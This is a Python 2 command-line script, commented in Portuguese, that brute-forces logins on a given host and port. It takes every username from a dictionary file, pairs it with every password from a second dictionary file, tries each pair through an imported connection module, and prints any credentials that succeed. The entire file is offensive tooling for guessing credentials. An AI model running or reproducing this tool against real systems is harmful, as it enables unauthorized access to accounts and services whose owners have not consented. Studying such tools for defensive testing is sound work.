#!/usr/bin/python
# coding: utf-8

import sys

from bibliotecas.conexao import *
from bibliotecas.bruteforce import *

# Instanciar as classes bases do sistema.
bruteforce = Bruteforce()
conexao = Conexao()

# Verifica se tem argumento para iniciar o scanner.
if len( sys.argv ) != 1:
	if sys.argv[1] == "--scan":
		if len(sys.argv) == 4:	
			conexao.setHost( sys.argv[2] )
			conexao.setPorta( int( sys.argv[3] ) )
		else:
			bruteforce.modoUsar()

		usuarios = open( 'dicionario/usuarios.txt' )
		for usuario in usuarios:
			# Arquivo com as senhas.
			senhas = open( 'dicionario/senhas.txt' )
			for senha in senhas:	
				if conexao.verificarLogin( usuario.rstrip(), senha.rstrip() ) == True:
					print "\033[32mEncontrou! Usuario: " +  usuario.rstrip() + " / Senha: " + senha.rstrip() + "\033[0;0m"   

	elif sys.argv[1] == '--help':
		bruteforce.modoUsar()
		sys.exit()

		# Caso o argumento seja para help:
	elif sys.argv[1] == '--about':
		bruteforce.sobreSN()
		sys.exit()

else:
	print "Modo de usar:"
	print "./bruteforce.py <parametro> <hostname> <porta>"
	sys.exit()


